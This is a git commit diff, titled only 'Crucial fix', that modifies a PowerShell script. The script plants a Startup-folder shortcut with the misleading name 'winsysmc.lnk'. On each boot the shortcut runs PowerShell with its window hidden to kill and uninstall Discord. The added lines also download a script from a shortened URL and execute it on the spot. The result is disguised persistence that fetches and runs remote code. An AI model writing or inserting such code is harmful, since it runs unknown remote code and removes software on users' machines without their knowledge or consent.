502b627a1da37961d476720e58d92e019ede9dbe
Jakov C <qwerasdftzu@gmail.com>
2023-12-24 14:39:53 +0100

    Crucial fix

--- startup-script/uninstall-discord-every-boot.ps1
+++ startup-script/uninstall-discord-every-boot.ps1
@@ -1,4 +1,18 @@
-$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winsysmc.lnk")
-$Shortcut.TargetPath = "powershell -w h taskkill /f /im discord.exe;winget uninstall Discord.Discord"
-$Shortcut.Save()
+$WshShell = New-Object -ComObject WScript.Shell
+
+# Define the path to the Startup folder
+$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+
+# Define the full path to the shortcut
+$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'winsysmc.lnk')
+
+# Create a shortcut object
+$shortcut = $WshShell.CreateShortcut($shortcutPath)
+
+# Set the target path of the shortcut to PowerShell with your script as an argument
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-w h iwr is.gd/HidePS | iex;taskkill /f /im discord.exe; winget uninstall Discord.Discord"
+$shortcut.WindowStyle = 2
+# Save the shortcut
+$shortcut.Save()
+exit;
